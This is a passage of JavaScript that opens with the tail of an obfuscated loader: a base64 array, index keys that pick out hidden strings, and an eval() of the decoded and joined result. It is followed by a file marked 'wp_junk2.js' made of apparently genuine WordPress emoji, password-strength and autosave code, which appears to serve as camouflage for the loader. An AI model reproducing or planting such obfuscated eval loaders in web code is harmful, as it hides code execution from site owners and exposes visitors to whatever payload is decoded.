    "MC40NDMwNTM1MjI4OTU5MTY4",
    "MC4xNjAxNzIzOTQ0OTM4MjQyNQ==",
    "MC4yODU1MTMyODk5NjcwNzM1",
    "MC40OTIyMjQzNDk2NzcwNTA4Nw==",
    "MC40NTU1MzkzNzcxOTM3Mzc4",
    "MC43MzExODkyMTQ0ODUxMDI0",
    "MC4xOTczNjUyODI2NzA4MTU0Mw=="
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 0;

  var _code = b64ToUtf8(_a[_k1]) + b64ToUtf8(_b[_k2]) + b64ToUtf8(_y[_k3]);
  eval(_code);
})();
/* >>> wp_junk2.js (46393 bytes) <<< */
(function(){
try{
var twemoji = function() {
    "use strict";
    var h = {
            base: "https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/",
            ext: ".png",
            size: "72x72",
            className: "emoji",
            convert: {
                fromCodePoint: function(d) {
                    d = "string" == typeof d ? parseInt(d, 16) : d;
                    if (d < 65536) return e(d);
                    return e(55296 + ((d -= 65536) >> 10), 56320 + (1023 & d))
                },
                toCodePoint: o
            },
            onerror: function() {
                this.parentNode && this.parentNode.replaceChild(x(this.alt, !1), this)
            },
            parse: function(d, u) {
                u && "function" != typeof u || (u = {
                    callback: u
                });
                return h.doNotParse = u.doNotParse, ("string" == typeof d ? function(d, a) {
                    return n(d, function(d) {
                        var u, f, c = d,
                            e = N(d),
                            b = a.callback(e, a);
                        if (e && b) {
                            for (f in c = "<img ".concat('class="', a.className, '" ', 'draggable="false" ', 'alt="', d, '"', ' src="', b, '"'), u = a.attributes(d, e)) u.hasOwnProperty(f) && 0 !== f.indexOf("on") && -1 === c.indexOf(" " + f + "=") && (c = c.concat(" ", f, '="', u[f].replace(t, r), '"'));
                            c = c.concat("/>")
                        }
                        return c
                    })
                } : function(d, u) {
                    var f, c, e, b, a, t, r, n, o, s, i, l = function d(u, f) {
                            var c, e, b = u.childNodes,
                                a = b.length;
                            for (; a--;) c = b[a], 3 === (e = c.nodeType) ? f.push(c) : 1 !== e || "ownerSVGElement" in c || m.test(c.nodeName.toLowerCase()) || h.doNotParse && h.doNotParse(c) || d(c, f);
                            return f
                        }(d, []),
                        p = l.length;
                    for (; p--;) {
                        for (e = !1, b = document.createDocumentFragment(), a = l[p], t = a.nodeValue, r = 0; o = g.exec(t);) {
                            if ((i = o.index) !== r && b.appendChild(x(t.slice(r, i), !0)), s = N(o = o[0]), r = i + o.length, i = u.callback(s, u), s && i) {
                                for (c in (n = new Image).onerror = u.onerror, n.setAttribute("draggable", "false"), f = u.attributes(o, s)) f.hasOwnProperty(c) && 0 !== c.indexOf("on") && !n.hasAttribute(c) && n.setAttribute(c, f[c]);
                                n.className = u.className, n.alt = o, n.src = i, e = !0, b.appendChild(n)
                            }
                            n || b.appendChild(x(o, !1)), n = null
                        }
                        e && (r < t.length && b.appendChild(x(t.slice(r), !0)), a.parentNode.replaceChild(b, a))
                    }
                    return d
                })(d, {
                    callback: u.callback || b,
                    attributes: "function" == typeof u.attributes ? u.attributes : a,
                    base: ("string" == typeof u.base ? u : h).base,
                    ext: u.ext || h.ext,
                    size: u.folder || function(d) {
                        return "number" == typeof d ? d + "x" + d : d
                    }(u.size || h.size),
                    className: u.className || h.className,
                    onerror: u.onerror || h.onerror
                })
            },
            replace: n,
            test: function(d) {
                g.lastIndex = 0;
                d = g.test(d);
                return g.lastIndex = 0, d
            }
        },
        u = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            "'": "&#39;",
            '"': "&quot;"
        },
        g = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b|\ud83d\udc26\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[\xa9\xae\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|\ud83e\udef0|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef1-\udef8]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udc8e\udc90\udc92-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5-\uded7\udedc-\udedf\udeeb\udeec\udef4-\udefc\udfe0-\udfeb\udff0]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd76\udd78-\uddb4\uddb7\uddba\uddbc-\uddcc\uddd0\uddde-\uddff\ude70-\ude7c\ude80-\ude88\ude90-\udebd\udebf-\udec2\udece-\udedb\udee0-\udee8]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
        f = /\uFE0F/g,
        c = String.fromCharCode(8205),
        t = /[&<>'"]/g,
        m = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
        e = String.fromCharCode;
    return h;

    function x(d, u) {
        return document.createTextNode(u ? d.replace(f, "") : d)
    }

    function b(d, u) {
        return "".concat(u.base, u.size, "/", d, u.ext)
    }

    function N(d) {
        return o(d.indexOf(c) < 0 ? d.replace(f, "") : d)
    }

    function r(d) {
        return u[d]
    }

    function a() {
        return null
    }

    function n(d, u) {
        return String(d).replace(g, u)
    }

    function o(d, u) {
        for (var f = [], c = 0, e = 0, b = 0; b < d.length;) c = d.charCodeAt(b++), e ? (f.push((65536 + (e - 55296 << 10) + (c - 56320)).toString(16)), e = 0) : 55296 <= c && c <= 56319 ? e = c : f.push(c.toString(16));
        return f.join(u || "-")
    }
}();
// Source: wp-includes/js/wp-emoji.min.js
! function(c, l) {
    c.wp = c.wp || {}, c.wp.emoji = new function() {
        var n, u, e = c.MutationObserver || c.WebKitMutationObserver || c.MozMutationObserver,
            a = c.document,
            t = !1,
            r = 0,
            o = 0 < c.navigator.userAgent.indexOf("Trident/7.0");

        function i() {
            return !a.implementation.hasFeature || a.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1")
        }

        function s() {
            if (!t) {
                if (void 0 === c.twemoji) return 600 < r ? void 0 : (c.clearTimeout(u), u = c.setTimeout(s, 50), void r++);
                n = c.twemoji, t = !0, e && new e(function(u) {
                    for (var e, t, n, a, r = u.length; r--;) {
                        if (e = u[r].addedNodes, t = u[r].removedNodes, 1 === (n = e.length) && 1 === t.length && 3 === e[0].nodeType && "IMG" === t[0].nodeName && e[0].data === t[0].alt && "load-failed" === t[0].getAttribute("data-error")) return;
                        for (; n--;) {
                            if (3 === (a = e[n]).nodeType) {
                                if (!a.parentNode) continue;
                                if (o)
                                    for (; a.nextSibling && 3 === a.nextSibling.nodeType;) a.nodeValue = a.nodeValue + a.nextSibling.nodeValue, a.parentNode.removeChild(a.nextSibling);
                                a = a.parentNode
                            }
                            d(a.textContent) && f(a)
                        }
                    }
                }).observe(a.body, {
                    childList: !0,
                    subtree: !0
                }), f(a.body)
            }
        }

        function d(u) {
            return !!u && (/[\uDC00-\uDFFF]/.test(u) || /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/.test(u))
        }

        function f(u, e) {
            var t;
            return !l.supports.everything && n && u && ("string" == typeof u || u.childNodes && u.childNodes.length) ? (e = e || {}, t = {
                base: i() ? l.svgUrl : l.baseUrl,
                ext: i() ? l.svgExt : l.ext,
                className: e.className || "emoji",
                callback: function(u, e) {
                    switch (u) {
                        case "a9":
                        case "ae":
                        case "2122":
                        case "2194":
                        case "2660":
                        case "2663":
                        case "2665":
                        case "2666":
                            return !1
                    }
                    return !(l.supports.everythingExceptFlag && !/^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test(u) && !/^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test(u)) && "".concat(e.base, u, e.ext)
                },
                attributes: function() {
                    return {
                        role: "img"
                    }
                },
                onerror: function() {
                    n.parentNode && (this.setAttribute("data-error", "load-failed"), n.parentNode.replaceChild(a.createTextNode(n.alt), n))
                },
                doNotParse: function(u) {
                    return !(!u || !u.className || "string" != typeof u.className || -1 === u.className.indexOf("wp-exclude-emoji"))
                }
            }, "object" == typeof e.imgAttr && (t.attributes = function() {
                return e.imgAttr
            }), n.parse(u, t)) : u
        }
        return l && (l.DOMReady ? s() : l.readyCallback = s), {
            parse: f,
            test: d
        }
    }
}(window, window._wpemojiSettings);
window.wp = window.wp || {},
    function(a) {
        var e = wp.i18n.__,
            n = wp.i18n.sprintf;
        wp.passwordStrength = {
            meter: function(e, n, t) {
                return Array.isArray(n) || (n = [n.toString()]), e != t && t && 0 < t.length ? 5 : void 0 === window.zxcvbn ? -1 : zxcvbn(e, n).score
            },
            userInputBlacklist: function() {
                return window.console.log(n(e("%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."), "wp.passwordStrength.userInputBlacklist()", "5.5.0", "wp.passwordStrength.userInputDisallowedList()")), wp.passwordStrength.userInputDisallowedList()
            },
            userInputDisallowedList: function() {
                var e, n, t, r, s = [],
                    i = [],
                    o = ["user_login", "first_name", "last_name", "nickname", "display_name", "email", "url", "description", "weblog_title", "admin_email"];
                for (s.push(document.title), s.push(document.URL), n = o.length, e = 0; e < n; e++) 0 !== (r = a("#" + o[e])).length && (s.push(r[0].defaultValue), s.push(r.val()));
                for (t = s.length, e = 0; e < t; e++) s[e] && (i = i.concat(s[e].replace(/\W/g, " ").split(" ")));
                return i = a.grep(i, function(e, n) {
                    return !("" === e || e.length < 4) && a.inArray(e, i) === n
                })
            }
        }, window.passwordStrength = wp.passwordStrength.meter
    }(jQuery);


/**
 * @output wp-includes/js/autosave.js
 */

/* global tinymce, wpCookies, autosaveL10n, switchEditors */
// Back-compat.
window.autosave = function() {
	return true;
};

/**
 * Adds autosave to the window object on dom ready.
 *
 * @since 3.9.0
 *
 * @param {jQuery} $ jQuery object.
 * @param {window} The window object.
 *
 */
( function( $, window ) {
	/**
	 * Auto saves the post.
	 *
	 * @since 3.9.0
	 *
	 * @return {Object}
	 * 	{{
	 * 		getPostData: getPostData,
	 * 		getCompareString: getCompareString,
	 * 		disableButtons: disableButtons,
	 * 		enableButtons: enableButtons,
